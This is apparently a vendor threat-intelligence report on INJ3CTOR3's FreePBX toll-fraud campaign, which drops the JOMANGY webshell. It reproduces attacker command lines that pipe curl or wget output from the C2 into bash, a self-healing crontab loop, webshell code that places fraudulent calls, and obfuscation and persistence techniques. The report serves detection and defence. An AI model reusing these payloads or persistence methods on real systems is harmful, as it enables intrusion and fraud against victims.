---
schema_version: "1.0.0"
document_id: "51f977c98f1318c9ca23811d5f9f1f43771bc89a34d3da00092ccccc7d88bda1"
company_key: "yc-cyble"
company: "Cyble"
source_id: "yc-cyble-rss-726d4f5fb2f2"
canonical_url: "https://cyble.com/blog/jomangy-inj3ctor3s-self-healing-freepbx-toll-fraud-campaign/"
published_at: "2026-05-21T13:51:47+00:00"
first_seen_at: "2026-07-20T23:20:21.475332+00:00"
fetched_at: "2026-07-28T20:50:36.289404+00:00"
content_hash: "sha256:7679376d5e59b470b30330da593e2244e057c9ab8660ffb4668ea087ee91dc1f"
---

# JOMANGY: INJ3CTOR3’s Self-Healing FreePBX Toll Fraud Campaign

Link copied!


[Cyber news](https://cyble.com/blog/category/cyber-news/)


# JOMANGY: INJ3CTOR3’s Self-Healing FreePBX Toll Fraud Campaign


CRIL uncovers JOMANGY, a stealth PHP webshell by INJ3CTOR3 with 6 persistence layers and self-healing cron jobs built to survive host cleanup.


May 21, 2026 · 28 min read


## Executive Summary


Cyble Research & Intelligence Labs (CRIL) has identified an active FreePBX exploitation campaign, with high confidence tied to INJ3CTOR3, an actor with a documented history of targeting VoIP infrastructure for financial gain since 2019.


The campaign deploys a multi-stage Bash dropper that introduces JOMANGY, a PHP webshell family with no prior public documentation, alongside[ZenharR](https://unit42.paloaltonetworks.com/digium-phones-web-shell/) , previously attributed to the same actor lineage. Every deployed webshell instance carries live VoIP toll fraud code that routes calls through the victim’s own SIP trunks at the victim’s expense. A C2-hosted IP inventory of 3,080 addresses, assessed as scanner output from a co-located reconnaissance node, reflects the operational scale.


*Figure 1 – Campaign Architecture*


The persistence architecture distinguishes this generation from prior INJ3CTOR3 campaigns. Six independent channels protect each other, spanning cron-based C2 polling, shell profile injection, immutable crontab backups, a process watchdog, chattr +i-protected webshell copies, and a self-reinstalling PHP executor. Any single surviving channel is enough to re-establish the full infection within minutes. Partial remediation is, by design, functionally useless.


The infection chain also drops 18 backdoor accounts across three tiers. Nine have UID-0 (root-equivalent) privileges, eight are service-tier OS accounts, and one is a FreePBX web panel account injected directly into MySQL. Account names are deliberately chosen to blend into the legitimate FreePBX service account inventory.


## Key Takeaways ****


- **JOMANGY** is a PHP webshell family with no prior public documentation (this analysis being its first description). Every deployed instance uses double-layer obfuscation (base64 over ROT13) and carries the watermark string *‘trace_e1ebf9066a951be519a24140711839ea’, tying all campaign webshells back to a single* source.
- The campaign establishes **six independent persistence channels** that protect each other: cron-based C2 polling every one to three minutes; shell profile injection firing on root login and reboot; eight chattr +i-immutable crontab backups protected by two separate restore cron loops; a process watchdog that respawns the beacon; chattr +i-protected webshell copies; and a PHP executor with its own cron reinstallation logic. Any single surviving channel re-establishes the full infection within minutes.
- **18 backdoor accounts** land across the infection chain in three tiers: nine UID-0 (root-equivalent) OS accounts, eight service-account-tier OS accounts, and one FreePBX web panel account injected directly into MySQL. Account names such as asterisk, asteriskuser, freepbxuser, and spamfilter are deliberately chosen to blend into the legitimate FreePBX service account inventory.
- All three deployed webshell instances carry live **VoIP toll fraud code** that places calls through the victim’s own SIP trunks via asterisk -rx “channel originate Local/<num>@<context>”. A C2-hosted **IP address** inventory (people2.txt, **3,080** entries, assessed as scanner output), with roughly 39% pointing at Alibaba Cloud-hosted infrastructure, highlights the operational scale.
- The Stage 1 dropper evicts **50+ webshell signatures** and blocks 11 competitor C2 IPs bidirectionally, while simultaneously self-evicting every artifact from INJ3CTOR3’s own January 2026 campaign, consistent with the operator migrating their active botnet from Brazilian to Dutch infrastructure between campaign generations.
- At the time of analysis, we were not able to recover the exploit payload and could not confirm the entry vector from artifacts alone. The artifacts point to two candidate CVEs with high confidence: **CVE-2025-64328** (FreePBX filestore module post-auth command injection, the documented prior-campaign entry vector) and **CVE-2025-57819** (FreePBX Endpoint module pre-auth SQL injection via cron_jobs, whose WatchTowr Labs PoC artifacts the Stage 1 dropper explicitly evicts).
- Six independent artifact overlaps (the unique marker string \`bm2cjjnRXac1WW3KT7k6MKTR\`, the INJ3CTOR3 actor name appearing explicitly as an eviction target, the prior C2 \`45.234.176.202\` in the iptables block list, shared binary names and file paths, the \`newfpbx\` UID-0 backdoor account, and the MySQL \`ampusers\` insertion pattern) with Fortinet’s January 2026 encystPHP report tie this campaign to **INJ3CTOR3** , corroborated by Check Point Research (2020), Palo Alto Unit 42 (2022), and SANS ISC diary #32892 (2026-04-13). The C2 URL framework (/k.php, /z/wr.php, /z/post/root.php) has been in continuous operation since at least 2021.
- **k.php** (100259af)and **wr.php** (d40180f7) were **absent** from VirusTotal at the time of analysis. The primary **dropper** (b506fc82) had four detections across 76 engines. The operator actively rotates k.php content, which further degrades signature coverage over time.


## Attribution


We attribute the **JOMANGY** campaign to INJ3CTOR3 with high confidence based on the following:


- The eviction routine names bm2cjjnRXac1WW3KT7k6MKTR as a grep target (the same unique marker Fortinet identified in the January 2026 encystPHP dropper) and also names INJ3CTOR3 directly as an eviction target in the same block.
- The rest of the[Fortinet](https://www.fortinet.com/de/blog/threat-research/unveiling-the-weaponized-web-shell-encystphp) overlaps (prior C2 45\[.\]234\[.\]176\[.\]202 in the iptables block list, shared file paths and binary names, the newfpbx UID-0 backdoor, the MySQL ampusers pattern) confirm this.[Unit 42](https://unit42.paloaltonetworks.com/digium-phones-web-shell/) documented the same ZenharR toolset and identical C2 URL structure against the same actor in 2022.
- [SANS ISC diary #32892](https://www.fortinet.com/de/blog/threat-research/unveiling-the-weaponized-web-shell-encystphp) independently identified the current C2 and the shared password hash in April 2026.[Check Point Research](https://unit42.paloaltonetworks.com/digium-phones-web-shell/) traced the same eviction targets, b3d0r and yokyok, to this actor’s CVE-2019-19006 campaign in 2020.


For anyone tracking this actor long-term, it is worth noting that Juba was explicitly deleted and evicted in the January 2026 dropper. Yet, the current Stage 1 resets its password without recreating the account.


An operator working from someone else’s scripts would not know which dormant accounts to password-cycle. The motivation behind this is toll fraud, as in every generation of this campaign, since 2019. (See Figure 2)


*Figure 2 – JOMANGY Webshell Operator Panel*


## Victimology and Target Profile


The 3,080-IP inventory (people2.txt) is mostly APAC cloud: Alibaba Cloud, which spans China, Hong Kong, and Singapore, accounts for roughly 39%. The C2 was live during artifact collection, and the operator was actively updating the list between snapshots.


The Elastix SQLite database theft (/var/www/db/acl.db) and the use of account names such as Issabel and Sangoma indicate that the operator is targeting every major PBX platform family across Latin America, Southeast Asia, and the Middle East.


The 2 in people2.txt likely implies an earlier version of the list exists somewhere. Across 3,080 assessed entries, this is assessed as automated mass exploitation rather than a targeted campaign. (See Figure 3)


*Figure 3 – C2-hosted IP Inventory (people2.txt)*


## Background


VoIP toll fraud is one of the leading categories in a $41.82 billion global telecom fraud problem (CFCA, Global Fraud Loss Survey 2025 & \[9\]) that rarely makes it into mainstream security coverage.


FreePBX and Asterisk deployments have been a consistent target for financially motivated actors for most of the last decade. A FreePBX host with working SIP trunks gives an attacker direct access to the victim’s carrier accounts and the ability to originate calls at will.


Toll fraud avoids the operational overhead of ransomware negotiations or finding a data buyer by having the operator route calls through premium-rate numbers (IPRNs) they control or sell capacity to third-party fraud networks and then have the victim’s carrier send the bill.


Internet-exposed FreePBX management interfaces number globally in the tens of thousands, with a large fraction running end-of-life releases and minimal host hardening.


INJ3CTOR3 has been exploiting this attack surface continuously since at least 2019. Check Point Research documented the actor’s CVE-2019-19006 campaign in 2020. Palo Alto Unit 42 followed with a ZenharR-deploying generation targeting CVE-2021-45461 in 2022. Fortinet then covered the January 2026 encystPHP iteration operating from C2 45\[.\]234\[.\]176\[.\]202.


The Shadowserver Foundation tracked over 900 FreePBX instances that were actively compromised as of February 2026 and were tied to that campaign. By May 2026 (five months after public disclosure), 700+ remained compromised across North America, Europe, Asia, South America, Africa, and Oceania. That number reflects how genuinely difficult these infections are to clear. (See Figure 4)


*Figure 4 – Dashboard Victim overview (shadowserver.org)*


Shadowserver independently attributed the ongoing compromises to exploitation of CVE-2025-64328, the same CVE that emerges as a candidate for initial access in the current campaign.


We collected the current generation in April 2026 from a Bash dropper still communicating with an active C2 at 45\[.\]95\[.\]147\[.\]178 (using artifacts from C2’s web directory also referenced by[SANS ISC diary #32892](https://isc.sans.edu/diary/32892) ).


## Technical Analysis


**Initial Access Vector**


The earliest recovered artifact (Stage 1, b506fc82) is already executing on the victim system. No exploit payload or HTTP server access logs were recovered, so the initial entry point was not confirmed.


However, two CVEs emerge as high-confidence candidates, each tied to a distinct forensic indicator in the samples.


Every stage from Stage 1 through the license.php executor includes a line that scrubs Apache httpd logs of entries containing the string “restapps” (sed -i ‘/restapps/d’). The JOMANGY webshell cleanup routine also explicitly targets file patterns associated with WatchTowr Labs’ CVE-2025-57819 proof-of-concept.


Files matching *-watchTowr-*.php are searched for and deleted. Both patterns are confirmed in the sample. What they imply about the initial access vector is assessed, not confirmed. (See Figure 5)


*Figure 5 – Initial Access Suspects*


**CVE-2025-64328** is a post-authentication command-injection vulnerability in the FreePBX filestore module, affecting versions 17.0.2.36 through 17.0.3, and patched in 17.0.3 (CVSS 8.6,[FreePBX advisory](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-vm9p-46mv-5xvw) ). CISA added it to the KEV (Known Exploited Vulnerabilities) catalog in February 2026 following Shadowserver Foundation reporting of approximately 900 compromised instances beginning in December 2025.


Fortinet documented CVE-2025-64328 as the entry vector for the January 2026 prior encystPHP campaign operating from C2 45\[.\]234\[.\]176\[.\]202, the same prior campaign whose artifacts the current dropper systematically evicts. That direct lineage makes it a strong candidate for campaign continuity.


There is a caveat, though. CVE-2025-64328 operates through the filestore module at HTTP path /admin/ajax.php?module=filestore&command=testconnection.


The restapps log scrubbing present throughout every stage of the current campaign does not correspond to this module’s exploitation path and therefore, cannot be read as evidence of CVE-2025-64328 here.


That restapps log-scrubbing is better understood as a legacy behavioral artifact the actor has carried across every campaign generation since 2022, when CVE-2021-45461 (the Rest Phone Apps module RCE documented by[Unit 42](https://unit42.paloaltonetworks.com/digium-phones-web-shell/) ) served as the prior-generation entry vector and introduced ZenharR) persists as a carry-forward into the current campaign.


This behavioral continuity is analytically useful for long-term actor tracking, but it does not constrain the current entry vector assessment. CVE-2025-64328 and CVE-2025-57819 remain the high-confidence candidates for the current campaign.


**CVE-2025-57819** is a pre-authentication SQL injection vulnerability in the FreePBX Endpoint module. WatchTowr Labs[documented](https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/) active exploitation beginning September 2025, through a mechanism that inserts a malicious entry into the Endpoint module’s cron_jobs database table, causing FreePBX’s internal scheduler to execute arbitrary OS commands at one-minute intervals, a mechanism architecturally identical to this campaign’s own cron-persistence model ([WatchTowr Labs CVE-2025-57819 proof-of-concept](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819) ).


The pre-authentication nature is consistent with mass automated exploitation across a 3,080-entry assessed target inventory. The architecture presents an additional indicator: the prior encystPHP dropper (71d94479) explicitly disabled the Endpoint module ( *chmod 000 endpoint/ajax.php* ) and ( *fwconsole ma uninstall endpoint* , *fwconsole ma delete endpoint* ). (See Figure 6)


*Figure 6 – Disable Endpoint Module (EncystPHP)*


The current campaign does not disable the Endpoint module. If CVE-2025-57819 was the entry vector, disabling the module eliminates the entry path itself. An operator who still needs the module active for exploitation would leave it running. Therefore, we treat this architectural inference as the strongest available evidence linking CVE-2025-57819 to the current campaign.


### **Campaign Architecture and Staging**


The infection chain runs across three Bash payload stages, with license.php serving as a PHP executor component written to disk by those stages rather than fetched directly from the C2.


**Stage 1** (b506fc82) is the initial Bash dropper where a concurrent re-run variant (/x) re-applies the same host-takeover behaviors on already-owned hosts and is treated as part of Stage 1 rather than a separate stage.


**Stage 2** (k.php) deploys the JOMANGY webshell family and is the first one to write license.php to disk.


**Stage 3** (wr.php, d40180f7) is a ZenharR dropper that forms a second cron download track running in parallel with k.php. wor.php (995e6304) is a second ZenharR dropper hosted at /z/wor.php on the C2.


It was recovered from the C2 artifact dump, but has no trigger identified in any executed payload in the recovered artifact chain. **license.php** is a PHP command executor invoked via the FreePBX HA hook; it executes between Stage 2 and Stage 3 in the chain, then again after Stage 3 rewrites it. (See Figure 1 for the campaign architecture flow)


### **Stage-by-Stage Payload Analysis**


**Stage 1: Bash Dropper (23,355 bytes, b506fc82)**


The dropper runs in a deliberate order. Competitor eviction goes first, followed by credential implantation and persistence installation, with log destruction last. Running eviction up front clears competing implants and defensive tooling before the operator’s own infrastructure lands, shrinking the window where both sides’ webshells coexist on the same host.


It deletes previously placed download artifacts (devnull24, devnull23, devnull2, and prior campaign iteration artifacts, as confirmed by naming patterns). Lines 15-19 handle two things in parallel:


- A blanket userdel loop which removes all non-root accounts with UID 0 or UID >= 1000,
- A MySQL INSERT establishes the FreePBX web panel backdoor for account freepbxusers with admin-level access (sections=*) and password SHA1 hash 6ea9c6d2d932532a4cd44c7974fb1a0a87dbfcf9.


Then it runs the bulk competitor webshell eviction, searching /var/www/html/ and /var/www/ for approximately 50 named webshell signatures and deleting matching PHP files. (See Figure 7)


*Figure 7 – Backdooring & Webshell Eviction*


**Credential implantation** runs in two tiers. Lines 262-264 decode and execute three base64-obfuscated useradd commands that create UID-0 accounts newfpbxs, newfpbx, and xhimax with the shared MD5-crypt password hash. Lines 292-298 create seven more UID-0 accounts in plaintext: centos, admin, support, issabel, sangoma, emo, and xhimax (a redundant second creation of xhimax).


It creates eight non-UID-0 accounts (sugarmaint, spamfilter, asteriskuser, supports, freepbxuser, supermaint, asterisk, and hima), all sharing the same MD5-crypt password hash, and applies (Lines 312-321) the same hash to ten accounts, including root itself, via chpasswd -e. (See Figure 8)


*Figure 8 – Credential Implantation*


Stage 1 installs persistence across two active tracks. The first is recurring cron polling of k.php every one to three minutes. The second is a shell profile stager appended to /root/.bash_profile, /root/.bashrc, and /etc/rc.local, which run on every root login and system reboot.


Lines 272-278 also execute a one-time phone-home to the C2 root index (http://45\[.\]95\[.\]147\[.\]178/) immediately on first run, separate from the cron infrastructure and effective even if the cron subsystem is blocked at execution time.


The active crontab is written to eight hidden, chattr +i-immutable backup paths using system-mimicking directory names, protected by two independent restore loops and a process watchdog.


Stage 1 deploys no webshells. That work is deferred entirely to Stage 2, an intentional departure from the prior encystPHP generation, which wrote the webshell directly from the initial dropper.


The full per-channel breakdown (including **self-healing** mechanism) is covered in the Persistence Mechanisms section below. (See Figure 9)


Figure 9 – Cron Polling for k.php


The dropper closes with SSH hardening and log wiping. (See Figure 10)


*Figure 10 – SSH Hardening & Log Wipe*


**Stage 2: k.php (100259af, approximately 45KB, Bash)**


It opens by fetching and executing /x via curl (curl http://45\[.\]95\[.\]147\[.\]178/x -ks | bash), re-applying the Stage 1 host-takeover behaviors before any webshell deployment begins.


Line 3 decodes a base64 blob and writes it to */var/www/html/admin/views/ajax.php* , the FreePBX admin AJAX endpoint, and a high-traffic legitimate file that provides cover for the webshell.


Lines 15-25 copy the same blob to more than ten additional paths across the FreePBX web tree, including /var/www/html/h.php, /var/www/html/rest_phones/ajax.php, /var/www/html/admin/modules/h/ (ajax.php, config.php, index.php), and subdirectories under fpbxphones/ and phones/.


Lines 27-28 write an .htaccess rewrite rule (RewriteEngine On; RewriteRule .* config.php), so any request to an unrecognized path within those directories lands on a webshell copy.


Lines 7-8 reinstall the MySQL ampusers backdoor using the same DELETE + INSERT pattern as Stage 1, replanting the freepbxusers web panel account every time k.php executes.


Lines 9-10 redundantly repeat the useradd invocations for newfpbx and xhimax. Lines 29-30 apply chattr +i to the primary webshell files. Lines 31-32 execute a base64-decoded tryRoot1.sh shell script (run twice redundantly), which writes */var/www/html/admin/modules/freepbx_ha/license.php* and triggers the FreePBX HA hooks.


The operator rotates k.php actively. The artifact collected (100259af, ~45KB) and the VT URL last-fetch variant (49abb105, retrieved 2026-04-29) are distinct, which suggests that what a victim receives from k.php at any given moment may differ from what was analyzed here. (See Figure 11)


*Figure 11 – k.php*


The PHP webshell blob is double-obfuscated: an outer base64 layer encodes a PHP string that, when decoded, applies str_rot13() to a second encoded layer before passing the result to eval(). Once decoded, the webshell presents a form with <input type=”submit” name=”JOMANGY” value=”JOMANGY”>, the identifier establishing this as the **JOMANGY** family.


The outer PHP wrapper includes dead-code AV evasion and a watermark comment,/* trace_e1ebf9066a951be519a24140711839ea */, which appears in each deployed instance, tying deployments in this campaign to a single common source. (See Figure 12)


*Figure 12 – Embedded JOMANGY webshell*


**Stage 3: wr.php (d40180f7, 27KB, Bash)**


wr.php mirrors the k.php structure but targets a different primary webshell path set and deploys the ZenharR family. It opens with the same concurrent dropper execution (curl[http://45\[.\]95\[.\]147\[.\]178/x](http://45.95.147.178/x) -ks | bash), then writes a ZenharR webshell blob to two paths simultaneously via tee: */var/www/html/digium_phones/ajax.php* and */var/www/html/admin/views/some.php* .


The subsequent 15 cp commands (lines 4 and 16–29) copy from */var/www/html/admin/views/ajax.php* , which at this point contains the JOMANGY webshell placed by k.php, to 15 additional some.php paths across the FreePBX web tree.


These copies, therefore, propagate JOMANGY, not ZenharR. wr.php applies .htaccess and chattr +i to its primary write targets, runs the MySQL backdoor reinstallation with the same freepbxusers SHA1 hash, and calls back to[http://45\[.\]95\[.\]147\[.\]178/z/post/noroot.php](http://45.95.147.178/z/post/noroot.php) *| sh* after completing ZenharR deployment and file propagation, then once again after executing tryRoot1.sh.


The tryRoot1.sh execution writes */var/www/html/admin/modules/freepbx_ha/license.php* and triggers the FreePBX HA hooks by writing a trigger token to */usr/local/asterisk/ha_trigger* and */usr/local/asterisk/ha_triggers* .


The wr.php cron entries land on a victim through two independent paths: license.php’s dual-track reinstallation logic, and a set of explicit wget …/z/wr.php … | crontab – commands baked directly into the tryRoot1.sh payload embedded in wr.php itself.


The license.php path is the shared channel, and the direct crontab install is a wr.php-specific fallback. A defender who neutralizes the license.php-mediated cron track but leaves wr.php’s own tryRoot1.sh reachable still gets wr.php re-established on its own. (See Figure 13)


*Figure 13 – wr.php*


**Stage 3 (parallel): wor.php (995e6304, 13KB, Bash)**


wor.php is a lighter-weight dropper hosted at /z/wor.php on the C2 but with no trigger identified in any executed payload in the recovered artifact chain (see Campaign Architecture above). Unlike wr.php, it does not chain the concurrent dropper (x).


It writes a ZenharR webshell blob via tee to both /var/www/html/digium_phones/ajax.php and /var/www/html/admin/views/ajax.php simultaneously — the latter overwriting the JOMANGY webshell that k.php placed there, replacing it with ZenharR.


The 10 subsequent cp commands copy the contents of admin/views/ajax.php, which now holds ZenharR, to 10 additional paths. wor.php applies an .htaccess rewrite rule but has no chattr +i commands.


It calls back to *hxxp://45\[.\]95\[.\]147\[.\]178/z/post/noroot.php| sh* after completing ZenharR deployment and file propagation, then once again after executing the tryRoot1.sh sequence.


The deployed ZenharR instance uses a distinct auth hash (b92c65af386ed772972b43cab0d55a4a) and embeds operator VPN IP 169\[.\]150\[.\]218\[.\]33.


At the time of analysis, the noroot.php endpoint served an empty response, indicating a non-root execution callback path that is prepared but not yet populated with commands.


**freepbx_ha/license.php (PHP executor)**


license.php is a PHP script written to disk by tryRoot1.sh and invoked via the FreePBX HA mechanism. It contains system(‘%s’), a format-string placeholder that the operator populates through the JOMANGY webshell before triggering the HA hook, providing privileged arbitrary command execution. Unlike the JOMANGY and ZenharR browser-accessible webshells, license.php lacks an authentication mechanism and eval-based obfuscation.


Beyond that command slot, the script runs three independent user-deletion loops clearing all non-root UID-0 and UID-≥1000 accounts; chpasswd operations setting ueteGJYCHeMTk on root and seven service accounts (sugarmaint, spamfilter, asteriskuser, supports, asterisk, freepbxuser, and supermaint); useradd commands promoting sugarmaint, supports, and supermaint to UID-0; SSH hardening; httpd log scrubbing; a dual-track cron reinstallation covering both k.php and z/wr.php download paths; and a final curl http://45\[.\]95\[.\]147\[.\]178/z/post/root.php | sh. At the time of analysis, root.php served a 12-byte #!/bin/bash stub with no active commands.


The script also explicitly enables PermitRootLogin, opens TCP/22 through iptables, and restarts sshd to ensure remote administrative access remains available. (See Figure 14)


*Figure 14 – license.php*


**Obfuscation and Evasion Techniques**


Stage 1’s encoding choices are purposeful. Most of the script runs in plaintext, including competitor eviction, iptables rules, and log deletion. The base64 encoding is reserved specifically for the UID-0 useradd invocations (lines 262-264) and the shell profile stager (line 302).


The -ou 0 flag combination is one of the more reliable behavioral heuristics in endpoint tooling, and encoding those three lines costs the operator nothing while suppressing the most detectable pattern in the dropper.


The cron payload variables (B64_ZEN2, B64_DEVNULL, B64_HEAL) are stored as base64 strings decoded inline at runtime. A crontab -l on a victim host returns what appears to be benign variable assignments.


The download URLs and execution commands are not visible without manually decoding each variable. (See Figure 15)


*Figure 15 – base64 encoded useradd invocations*


JOMANGY’s encoding is a step up from what this operator has used before. The outer PHP blob runs str_rot13() on an inner base64 payload before passing to eval(). In practice, automated analysis tools that stop after a single base64 decode pass produce ROT13 output, not PHP, and yield nothing actionable.


The dead-code stub (if(false){ $SdDDlKoPiuhDB = ‘deadcode_anti_av’; }) is a separate trick that targets static heuristics that flag PHP files for suspicious variable assignments. The variable exists only inside a branch that never executes. Neither of the techniques used is novel, but both offer cheap modifications with measurable payoff. (See Figure 16)


*Figure 16 – JOMANGY base64 decoded rot13 output*


k.php, and wr.php had zero VirusTotal submissions at the time of analysis, and Stage 1 came in at four detections across 76 engines. (See Figure 17)


*Figure 17 – STAGE 1 dropper detections*


**Persistence Mechanisms**


The campaign establishes six independent persistence channels, engineered so that partial remediation leaves the infection intact and capable of full re-establishment.


**Channel 1: Primary cron polling:** We observed 8 cron entries installed across 2 blocks download *hxxp://45\[.\]95\[.\]147\[.\]178/k.php* every one to three minutes and execute the result under varying binary paths in /var/lib/asterisk/bin/, /dev/shm/.systemd/, and /tmp/.cache/.


This is the primary beacon: every minute, the crontab runs, fetching the latest version of k.php and re-executing it, redeploying any removed webshells within 3 minutes. (See Figure 18)


*Figure 18 – Primary Cron Polling*


**Channel 2: Shell profile persistence.** Stage 1 appends a base64-encoded download-and-execute stager to /root/.bash_profile, /root/.bashrc, and /etc/rc.local. This channel fires on every interactive root login and every system reboot, independently of the cron subsystem. An operator who kills all running dropper processes and clears the crontab will re-trigger the infection on the next login or reboot. (See Figure 19)


*Figure 19 – Shell Profile Persistence*


**Channel 3: Self-healing crontab backup system.** Stage 1 writes the active crontab to eight hidden paths using directory names that mimic legitimate system directories. Each file is immediately flagged immutable with *chattr +i* , so that *rm -rf* executed even by root silently fails without error. Two separate cron restore entries, then protect these backups.


The first (B64_HEAL, line 357) fires at a random minute every hour and decodes to: *for b in <all 8 paths>; do \[ -s “$b” \] && crontab “$b” && break; done* .


The second (line 359) fires every minute with an inline condensed version, iterating five of the eight paths.


A defender who removes only the B64_HEAL entry leaves the per-minute restore entry active.


A defender who removes both restore entries but misses the immutable flag on even one backup file finds the crontab reinstalled within an hour when the next dropper execution re-installs the restore entries.


Leaving any single channel intact causes full infection to re-establish within minutes. (See Figure 20)


*Figure 20 – Self-healing crontab backup system*


**Channel 4: Process watchdog.** Stage 1 installs a cron entry running *pgrep -x zen2 || bash <download_path> and pgrep -x devnull2 || bash <download_path>* . If either the primary beacon binary (zen2) or the secondary variant (devnull2) is absent from the process table, the watchdog re-downloads and re-executes k.php. Killing the beacon process without simultaneously removing the watchdog cron entry results in an immediate respawn.


**Channel 5: PHP webshells with immutability.** Stage 2 writes JOMANGY to over twelve paths while Stage 3 adds more. wr.php drops ZenharR directly into digium_phones/ajax.php and admin/views/some.php, then bulk-copies the existing JOMANGY shell to 15 additional paths via a cp loop. Primary copies carry *chattr +i* , so *rm -rf* issued as root returns without removing the file.


Each deployed instance is also a dropper in its own right, where a single authenticated HTTP request to any surviving shell triggers a full cron reinstall, credential rotation, and re-execution of all stages. If a defender misses one path during cleanup, the operator rebuilds the entire infection stack from a browser.


**Channel 6: freepbx_ha/license.php.** The PHP executor, triggered via the FreePBX HA hook mechanism, includes its own independent cron reinstallation logic for both k.php and wr.php download tracks. As long as this file exists on disk and the FreePBX HA module is installed, the operator can invoke it to rebuild the entire persistence stack from scratch. (See Figure 21)


*Figure 21 – license.php dual-track cron reinstall (wr.php & k.php)*


**Implant and Backdoor Analysis**


JOMANGY has no prior public documentation. This analysis is its first description. Every deployed instance carries the watermark /* trace_e1ebf9066a951be519a24140711839ea */, which makes hunting straightforward: any PHP file under the FreePBX web root containing that string is a campaign artifact. An earlier variant (SHA256 039d648b, VT first seen 2026-04-07) had a different auth hash (bfcedbc1831779921a0ee2cfaee004f2) and embedded operator IP 146\[.\]70\[.\]129\[.\]114 (AS9009 M247 Europe SRL). The operator rotated both webshell credentials and VPN provider between that early variant and the live campaign deployment, moving from M247 to Datapacket-hosted infrastructure somewhere in between. Below is the JOMANGY operator panel. (See Figure 22)


*Figure 22 – Operator Panel*


**ZenharR** was documented by Unit 42 in 2022 against the same actor lineage. This is tool reuse rather than a new family. The wr.php and wor.php instances have distinct auth hashes and embedded IPs per deployment (a2f6863…/169\[.\]150\[.\]218\[.\]37 and b92c65af…/169\[.\]150\[.\]218\[.\]33).


SANS ISC diary #32892 observed a third hash (cf710203400b8c466e6dfcafcf36a411) at /admin/modules/phones/ajax.php, a third deployed variant that was not in the collected artifact set. All instances use single-layer base64 + eval obfuscation and authenticate via md5($_REQUEST\[‘md5’\]) == ‘<hash>’; the C2’s ___ask.php and ___md5.php both serve the same live token (ec4ca4db5ec0b782e51224fa7082ac06), which enables the operator to rotate webshell credentials across all victims simultaneously by updating a single file.


Post-authentication, both webshell families expose the same capabilities. The VoIP fraud module is present in all instances:


if (isset($_REQUEST\[‘call’\])) {
system(‘asterisk -rx “channel originate Local/’
. $_REQUEST\[‘prs’\] . $_REQUEST\[‘num’\]
. ‘@’ . $_REQUEST\[‘context’\]
. ‘ application wait ‘
. $_REQUEST\[‘time’\] . ‘”‘);
}


Four parameters from the browser: prs (prefix/country code), num (destination), context (Asterisk dialplan context), and time (call duration). The webshell runs asterisk -rx locally. Victim’s trunks, victim’s bill.


The same channel-originating interface was documented in the 2022 ZenharR samples (Unit 42) and in the January 2026 VictamPbx webshells.


The remaining capabilities are consistent across all three instances: $_REQUEST\[‘cmd’\] -> system() for arbitrary OS commands; Elastix SQLite ACL database theft (/var/www/db/acl.db); and FreePBX admin session hijack via ampuser setAdmin().


**Command and Control**


The C2 at 45\[.\]95\[.\]147\[.\]178 (AS49870 Alsycon B.V., Netherlands) hosts the /z/ directory, the operator’s backend, four static text files with no panel, no framework, and no staging server visible from the recovered artifacts. ___ip.php serves a single IP address (169\[.\]150\[.\]218\[.\]33) that matches the operator VPN IP embedded in wor.php’s ZenharR authentication form; PTR resolution returns a Datapacket hostname (AS212238), consistent with dedicated operator-controlled infrastructure, though the file’s exact role on the C2 is not confirmed from the artifact alone.


___ask.php and ___md5.php both serve the same 32-byte string (ec4ca4db5ec0b782e51224fa7082ac06).


The most consistent read is that deployed webshells poll one of these endpoints to stay synchronized on the valid auth hash — a single file update on the C2 rotates credentials across every victim simultaneously.


___zen.php (a8b65af6c142736ccf80420e44df240f) is assessed as a ZenharR payload integrity reference; no mechanism confirming that function was identified in the recovered chain. (See Figure 23)


*Figure 23 – Operator VPN IPs (VirusTotal)*


The scanner 160\[.\]119\[.\]76\[.\]250 sits in the same AS49870 allocation as the primary C2 and was independently named by[SANS ISC diary #32892](https://isc.sans.edu/diary/32892) as the probe origin for this campaign.


**Competitor Eviction and Ecosystem Dynamics**


Stage 1 evicts two distinct sets of tooling. The first is the operator’s own prior-campaign artifacts; the January 2026 encystPHP infrastructure was cleared from every host being migrated to the new Dutch infrastructure.


The second is the standard competitor cleanup: roughly 50 webshell families deleted across the web tree and 11 external C2 IPs blocked bidirectionally, keeping the same pool of compromised FreePBX systems clear of actors who have been co-resident on them since at least 2020.


The self-eviction evidence is unambiguous. The prior campaign dropper (71d94479, January 2026, C2 45\[.\]234\[.\]176\[.\]202) deployed a webshell named “VictamPbx” with button markup name=”VictamPbx” and embedded the unique marker string bm2cjjnRXac1WW3KT7k6MKTR in its own competitor eviction grep list.


Both strings appear verbatim in the current Stage 1 dropper’s eviction routine, causing the current campaign to search for and delete files from the prior campaign’s own webshell family.


The prior C2 IP 45\[.\]234\[.\]176\[.\]202 appears on the current campaign’s iptables block list, blocking any still-running prior-campaign beacon from reaching its origin server.


The prior campaign’s download artifacts (devnull24, devnull23, devnull2) are explicitly deleted while every compromised host is moved from the January 2026 Brazilian infrastructure to the April 2026 Dutch infrastructure (every trace of the prior generation is carried over). (See Figure 24)


*Figure 24 – Self-eviction evidence*


The third-party cleanup spans roughly 50 webshell signatures: b374k, t3rr0r, Hacked, New-Pbx, FaTaLisTiCz_Fx, b3d0r, yokyok, watchTowr, nahda, bluej, Black Ban V1.01, and others. b3d0r and yokyok have appeared in INJ3CTOR3 eviction lists since 2020.


The same actors have been sharing these compromised hosts with INJ3CTOR3 for at least 6 years, only to be evicted with each new campaign generation.


The watchTowr entry is worth noting separately (the same research group whose CVE-2025-57819 PoC artifacts get evicted from disk) is also the source of the vulnerability most consistent with this campaign’s initial access method.


The iptables blocking goes in both directions — INPUT -s <C2> DROP stops competitor servers from delivering payloads or issuing commands; OUTPUT -d <C2> DROP stops the host from calling back, even if a competitor webshell survives the filesystem eviction.


The seven competitor IPs replaced in the FreePBX and Asterisk config files are the same C2 hijacking the 2022 generation. Wherever prior malware had pointed FreePBX to a competitor’s IP address, this campaign overwrites it with its own IP address, diverting any residual callbacks.


## Conclusion


JOMANGY is documented as a previously undocumented PHP webshell family, deployed with double-layer obfuscation, that outperforms every prior generation of INJ3CTOR3 tooling. k.php and wr.php arrived at near-zero AV coverage, and the operator is actively rotating k.php to sustain that gap.


What distinguishes this generation is not the count of persistence channels but the engineering logic connecting them. Each of the six channels can rebuild every other channel. Immutable crontab backups silently block root-level deletion. Every deployed webshell doubles as a complete dropper.


